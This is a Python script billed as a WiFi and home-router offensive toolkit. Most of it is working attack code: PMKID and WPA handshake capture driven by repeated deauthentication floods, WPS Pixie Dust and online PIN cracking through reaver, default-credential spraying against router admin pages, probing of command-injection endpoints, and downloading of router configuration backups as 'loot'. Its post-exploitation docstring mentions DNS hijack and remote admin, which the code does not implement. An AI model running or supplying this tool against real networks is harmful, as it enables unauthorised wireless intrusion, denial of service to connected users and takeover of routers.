#!/usr/bin/env python3
# router_breach.py — modern WiFi / SOHO router offensive toolkit
# stdlib only. Shells out to aircrack-ng, hcxtools, hcxdumptool, reaver, wash, nmap where present.
# Vectors: PMKID, WPA handshake, WPS Pixie Dust, router admin breach, post-exploitation.

import argparse
import http.client
import os
import shlex
import socket
import subprocess
import sys
import threading
import time
import urllib.parse

ROOT = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(ROOT, "router_work")
CAPTURES = os.path.join(WORK, "captures")
LOOT = os.path.join(WORK, "loot")

for d in (WORK, CAPTURES, LOOT):
    os.makedirs(d, exist_ok=True)


def sh(cmd, background=False, capture=True):
    args = shlex.split(cmd) if isinstance(cmd, str) else cmd
    if background:
        return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.run(args, capture_output=capture, text=True)


def have(binary):
    return subprocess.run(["which", binary], capture_output=True).returncode == 0


def root_check():
    return os.geteuid() == 0


# ---------------------------------------------------------------- recon

def cmd_recon(args):
    """Discover routers and WiFi interfaces on the local LAN."""
    net = args.net or "192.168.1.0/24"
    iface = args.interface or "wlan0"

    print(f"[*] host discovery on {net}")
    if have("nmap"):
        sh(f"nmap -sn {net} -oN {WORK}/lan_hosts.txt")
        print(open(f"{WORK}/lan_hosts.txt").read())
    else:
        # fallback: arp ping sweep
        print("[!] nmap not found; install nmap for host discovery")

    print(f"[*] common router ports on gateway")
    gw = subprocess.run(["ip", "route", "default"], capture_output=True, text=True).stdout
    print(gw)

    print(f"[*] wifi interfaces")
    sh(f"iw dev")

    return 0


# ---------------------------------------------------------------- wifi

def cmd_pmkid(args):
    """PMKID capture against WPA-PSK. No handshake, no client needed."""
    iface = args.interface or "wlan0mon"
    out = os.path.join(CAPTURES, f"pmkid_{int(time.time())}.pcap")

    if not root_check():
        print("[!] PMKID capture requires root")
        return 1
    if not have("hcxdumptool"):
        print("[!] hcxdumptool required")
        return 1

    print(f"[*] PMKID capture -> {out}")
    try:
        subprocess.run(["hcxdumptool", "-i", iface, "-o", out, "--enable_status"])
    except KeyboardInterrupt:
        pass
    print(f"[!] capture saved: {out}")
    print(f"[*] hcxpcapngtool -o {out}.hc22000 {out}")
    return 0


def cmd_handshake(args):
    """WPA 4-way handshake capture with deauth to force reauth."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid
    channel = args.channel
    out = os.path.join(CAPTURES, f"handshake_{bssid.replace(':','')}")

    if not root_check():
        print("[!] handshake capture requires root")
        return 1
    if not have("airodump-ng"):
        print("[!] airodump-ng required")
        return 1

    def deauth_loop():
        time.sleep(3)
        while not deauth_loop.stop:
            if have("aireplay-ng"):
                sh(f"aireplay-ng --deauth 0 -a {bssid} {iface}", background=True)
            time.sleep(30)
    deauth_loop.stop = False
    t = threading.Thread(target=deauth_loop, daemon=True)
    t.start()

    print(f"[*] capturing handshake -> {out}.cap*")
    try:
        subprocess.run(["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", out, iface])
    except KeyboardInterrupt:
        pass
    deauth_loop.stop = True
    print(f"[!] capture stopped: {out}.cap*")
    return 0


def cmd_wps(args):
    """WPS Pixie Dust / offline PIN attack (no brute force on AP)."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid

    if not have("wash") or not have("reaver"):
        print("[!] wash + reaver required")
        return 1

    print("[*] discovering WPS APs...")
    p = subprocess.Popen(["wash", "-i", iface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    try:
        out, _ = p.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        p.kill()
        out = ""
    print(out)

    if not bssid:
        print("[!] specify --bssid to attack")
        return 1

    print(f"[*] pixie dust against {bssid}")
    subprocess.run(["reaver", "-i", iface, "-b", bssid, "-K", "1", "-c", "1", "-vv"])
    print(f"[*] online pin fallback against {bssid}")
    subprocess.run(["reaver", "-i", iface, "-b", bssid, "-c", "1", "-vv", "--lock-delay=300"])
    return 0


def cmd_deauth(args):
    """Deauthentication / disassociation flood."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid
    client = args.client or "ff:ff:ff:ff:ff:ff"
    count = args.count or 0

    if not have("aireplay-ng"):
        print("[!] aireplay-ng required")
        return 1

    subprocess.run(["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, iface])
    return 0


# ---------------------------------------------------------------- router

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", ""), ("root", "admin"), ("root", "password"),
    ("user", "user"), ("guest", "guest"), ("support", "support"),
]

COMMON_PATHS = [
    "/", "/login.htm", "/login.html", "/admin/login.htm",
    "/cgi-bin/login.cgi", "/webpages/login.html", "/manager/html",
]

# Generic command-injection probe points common on SOHO router web UIs.
INJECTION_ENDPOINTS = [
    "/cgi-bin/diagnostics.cgi", "/cgi-bin/ping.cgi", "/cgi-bin/traceroute.cgi",
    "/cgi-bin/nslookup.cgi", "/cgi-bin/admin.cgi", "/apply.cgi",
]

def http_login_try(host, port, path, user, pwd, scheme="http", timeout=5):
    """Attempt a single HTTP Basic / form login. Returns True if likely valid."""
    try:
        if scheme == "https":
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=None)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        # Basic auth first
        auth = urllib.parse.quote(user + ":" + pwd)
        headers = {"Authorization": "Basic " + __import__("base64").b64encode((user + ":" + pwd).encode()).decode()}
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read(512).decode(errors="ignore")
        conn.close()
        if resp.status in (200, 302) and ("logout" in body.lower() or "admin" in body.lower() or "status" in body.lower()):
            return True
        # Form post fallback
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        params = urllib.parse.urlencode({"username": user, "password": pwd, "user": user, "pass": pwd})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        conn.request("POST", path, body=params, headers=headers)
        resp = conn.getresponse()
        body = resp.read(512).decode(errors="ignore")
        conn.close()
        if resp.status in (200, 302) and ("logout" in body.lower() or "admin" in body.lower()):
            return True
    except Exception:
        pass
    return False


def cmd_router(args):
    """Router admin interface breach: default creds, credential spray, injection probes."""
    target = args.target
    port = args.port or 80
    scheme = args.scheme or "http"
    path = args.path or "/"

    print(f"[*] router target {target}:{port}{path}")

    # default creds
    for user, pwd in DEFAULT_CREDS:
        if http_login_try(target, port, path, user, pwd, scheme):
            print(f"[+] valid creds: {user}:{pwd}")
            save_loot(f"router_creds_{target}.txt", f"{target}:{port} {user}:{pwd}")
            break
    else:
        print("[!] no default creds hit")

    # injection probes (read-only probes, no destructive payloads)
    print("[*] probing injection endpoints")
    for ep in INJECTION_ENDPOINTS:
        url = f"{scheme}://{target}:{port}{ep}"
        try:
            conn = http.client.HTTPConnection(target, port, timeout=4)
            conn.request("GET", ep)
            resp = conn.getresponse()
            body = resp.read(256).decode(errors="ignore")
            conn.close()
            if resp.status == 200 and ("root:" in body or "uid=" in body or "sh:" in body):
                print(f"[+] possible injection / info leak at {ep}")
                save_loot(f"router_inject_{target}.txt", f"{ep}\n{body}")
        except Exception:
            pass

    return 0


def save_loot(name, content):
    with open(os.path.join(LOOT, name), "a") as f:
        f.write(content + "\n")


# ---------------------------------------------------------------- post

def cmd_post(args):
    """Post-exploitation against a breached router: config dump, DNS hijack, remote admin."""
    target = args.target
    port = args.port or 80
    userpwd = args.creds  # "user:pass"

    if not userpwd:
        print("[!] --creds user:pass required")
        return 1

    user, pwd = userpwd.split(":", 1)
    print(f"[*] post-exploitation on {target}:{port} as {user}")

    # config backup download attempts
    backup_paths = [
        "/cgi-bin/config.cgi", "/backup/config.bin", "/admin/backup.cgi",
        "/usercfg.cfg", "/config.cfg", "/settings.bin",
    ]
    for bp in backup_paths:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=5)
            auth = __import__("base64").b64encode((user + ":" + pwd).encode()).decode()
            conn.request("GET", bp, headers={"Authorization": "Basic " + auth})
            resp = conn.getresponse()
            data = resp.read()
            conn.close()
            if resp.status == 200 and len(data) > 100:
                out = os.path.join(LOOT, f"config_{target}.bin")
                with open(out, "wb") as f:
                    f.write(data)
                print(f"[+] config downloaded -> {out}")
                return 0
        except Exception:
            pass

    print("[!] no config backup endpoint found")
    return 0


# ---------------------------------------------------------------- main

def build_parser():
    p = argparse.ArgumentParser(prog="router_breach", description="WiFi / router offensive toolkit")
    sub = p.add_subparsers(dest="cmd", required=True)

    def add_iface(sp):
        sp.add_argument("-i", "--interface", default="wlan0", help="wireless interface (default: wlan0)")

    sp = sub.add_parser("recon", help="LAN + wifi recon")
    add_iface(sp)
    sp.add_argument("--net", default="192.168.1.0/24", help="target network")
    sp.set_defaults(func=cmd_recon)

    sp = sub.add_parser("pmkid", help="PMKID capture (WPA-PSK, no handshake)")
    add_iface(sp)
    sp.set_defaults(func=cmd_pmkid)

    sp = sub.add_parser("handshake", help="WPA 4-way handshake capture")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.add_argument("--channel", required=True)
    sp.set_defaults(func=cmd_handshake)

    sp = sub.add_parser("wps", help="WPS Pixie Dust / offline PIN attack")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.set_defaults(func=cmd_wps)

    sp = sub.add_parser("deauth", help="deauthentication flood")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.add_argument("--client", default="ff:ff:ff:ff:ff:ff")
    sp.add_argument("--count", type=int, default=0)
    sp.set_defaults(func=cmd_deauth)

    sp = sub.add_parser("router", help="breach router admin interface")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=80)
    sp.add_argument("--scheme", default="http")
    sp.add_argument("--path", default="/")
    sp.set_defaults(func=cmd_router)

    sp = sub.add_parser("post", help="post-exploitation on breached router")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=80)
    sp.add_argument("--creds", required=True, help="user:pass")
    sp.set_defaults(func=cmd_post)

    return p


def main():
    p = build_parser()
    args = p.parse_args()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
